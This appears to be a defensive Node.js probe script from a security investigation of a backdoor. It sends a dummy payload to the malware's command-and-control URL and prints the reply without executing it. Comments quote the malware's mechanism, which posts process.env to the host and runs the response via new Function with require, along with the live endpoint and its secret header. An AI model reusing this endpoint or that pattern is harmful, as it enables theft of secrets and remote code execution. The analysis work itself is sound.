'use strict';

/**
 * Controlled observation of the backdoor's command-and-control (C2) endpoint.
 *
 * Purpose: document, for the security report, what the malicious endpoint used
 * by server/config/getContract.js returns — WITHOUT participating in the attack.
 *
 * Safety guarantees of this script:
 *   1. It NEVER sends process.env. The body is a clearly-labelled dummy object.
 *   2. It NEVER executes the response. The original malware pipes the response
 *      into `new Function('require', body)(require)`. Here the response is only
 *      printed as inert text. There is no eval / Function / require of it.
 *   3. It is meant to run inside an isolated, secret-free container.
 *
 * The endpoint and the "x-secret-header" value are copied verbatim from the
 * malicious code (server/config/constant.js + getContract.js) so the report
 * reflects the real behavior.
 */

const C2_URL = 'https://ipcheck-hashed.vercel.app/api/identity/1a6e008f91d4ca2566f4';

// Deliberately NOT process.env. A harmless marker payload only.
const DUMMY_PAYLOAD = {
  probe: 'authorized-security-analysis',
  note: 'no real environment variables are sent by this probe',
};

function sep(title) {
  console.log('\n' + '='.repeat(72));
  console.log(title);
  console.log('='.repeat(72));
}

async function observe(label, init) {
  sep(label);
  console.log(`URL: ${C2_URL}`);
  console.log(`Method: ${init.method}`);
  console.log('Request headers:', JSON.stringify(init.headers || {}));
  try {
    const res = await fetch(C2_URL, init);
    const text = await res.text();
    console.log(`Status: ${res.status} ${res.statusText}`);
    console.log('Response headers:');
    for (const [k, v] of res.headers.entries()) console.log(`  ${k}: ${v}`);
    console.log(`Response body length: ${text.length} bytes`);
    console.log('Response body (inert — NOT executed):');
    console.log(text.slice(0, 4000));

    // The malware would do: new Function('require', text)(require)
    // We explicitly DO NOT. We only report whether the body *looks* executable.
    const looksLikeCode = /require\s*\(|process\.|child_process|eval\(|fetch\(|https?:\/\//.test(text);
    console.log(`\nHeuristic: response ${looksLikeCode ? 'CONTAINS' : 'does not contain'} code-like / network indicators.`);
  } catch (err) {
    console.log(`Request error: ${err.message}`);
  }
}

async function main() {
  sep('C2 OBSERVATION — DEFENSIVE, NON-PARTICIPATING');
  console.log('This probe documents the backdoor endpoint. It does not exfiltrate');
  console.log('data and does not execute any response. See SECURITY_REPORT.md.');

  // 1) Plain GET — baseline behavior.
  await observe('1) Baseline GET (no secret header, no body)', { method: 'GET' });

  // 2) POST mimicking the malware's shape, but with a dummy body, to see what
  //    the server returns to a "real" client. The response is never executed.
  await observe('2) POST with x-secret-header and DUMMY body (env NOT sent)', {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-secret-header': 'secret' },
    body: JSON.stringify(DUMMY_PAYLOAD),
  });

  sep('OBSERVATION COMPLETE');
}

main().catch((err) => {
  console.error('Observer failed:', err.message);
  process.exit(1);
});
